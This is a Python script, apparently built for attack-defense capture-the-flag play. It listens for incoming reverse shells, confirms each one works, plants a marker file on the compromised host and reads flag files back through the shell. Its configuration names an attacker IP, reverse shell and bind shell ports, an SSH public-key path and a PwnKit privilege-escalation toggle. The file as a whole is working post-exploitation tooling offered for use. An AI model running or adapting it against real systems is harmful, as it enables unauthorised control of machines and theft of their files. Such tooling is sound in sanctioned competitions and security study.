from time import sleep
import socket
import threading
import base64
import re
import os

#string to put in IOC file
IOC_STRING = "07f34df3ad1de759f25a655363ef09b5"
#location to place IOC file
IOC_LOCATION = "/var/rand"
#our IP to catch reverse shell
IP = "10.2.18.7"
#our port to catch reverse shell
PORT = 51434
REVERSING_PORT = 31863
ID_RSA_PUB = "/tmp/id_rsa.pub"
#run PwnKit?
RUN_PWNKIT = 1
BIND_SHELL_PORT = 62672
#Ip blacklist (for spam)
BLACKLIST = []
#If you want to whitelist certain IPs, put them here and set WHITELIST to 1
WHITELIST = 0
WHITELIST_IPS = []
TEMP_LIST = []
FLAG_LOCATIONS = ["/flag.txt"]
SAVED_FLAGS = "/tmp/flags.txt"

def handler(conn):
    print("================= Connected =================")
    sleep(0.2)
    if conn.getpeername()[0] in BLACKLIST:
        print("================= Blacklisted IP =================")
        conn.close()
        return
    if WHITELIST == 1:
        if conn.getpeername()[0] not in WHITELIST_IPS:
            print("================= Not whitelisted IP =================")
            conn.close()
            return
    #print the ip of the connection
    print("================= Connected to " + conn.getpeername()[0] + " =================")
    #check connection by running 'which id' and seeing if response contains '/id'
    print("\033[?2004l", end="")
    print("================= Verifying connection =================")
    conn.send(b"which id\n")
    sleep(0.2)
    if b"/id" in conn.recv(1024):
        print("================= Connection verified =================")

        #do stuff here#########################################################
        conn.send(b"chmod 777 " + IOC_LOCATION.encode() + b"\n")
        sleep(0.2)
        conn.recv(1024).decode().strip()
        conn.send(b"echo " + IOC_STRING.encode() + b" > " + IOC_LOCATION.encode() + b"\n")
        sleep(0.2)
        conn.recv(1024).decode().strip()
        conn.send(b"chmod 555 " + IOC_LOCATION.encode() + b"\n")
        sleep(0.2)
        conn.recv(1024).decode().strip()
        for flag in FLAG_LOCATIONS:
            #save flags to file locally
            conn.send(b"bash -c 'builtin echo \"$(<" + flag.encode() + b")\"'\n")
            sleep(0.2)
            flag_data = conn.recv(1024).decode().strip()
            with open(SAVED_FLAGS, "w") as f:
                f.write(flag_data)
        #do stuff here#########################################################

        #print done on (the ip of the connection) and close connection
        print("================= Done on " + conn.getpeername()[0] + " =================")
        print("================= Waiting for shell to connect on port " + str(REVERSING_PORT) + " =================")
    else:
        print("================= Connection failed =================")
        #save IP to TEMP_LIST and if in list more than 2 times, add to BLACKLIST
        TEMP_LIST.append(conn.getpeername()[0])
        if TEMP_LIST.count(conn.getpeername()[0]) > 2:
            BLACKLIST.append(conn.getpeername()[0])
    conn.send(b"exit\n")
    conn.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
with socket.socket() as s:
    #open port and wait for connection from reverse shell
    s.bind(("0.0.0.0", REVERSING_PORT))
    s.listen()
    print("================= Waiting for shell to connect on port " + str(REVERSING_PORT) + " =================")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handler,args=(conn,), daemon=True).start() 
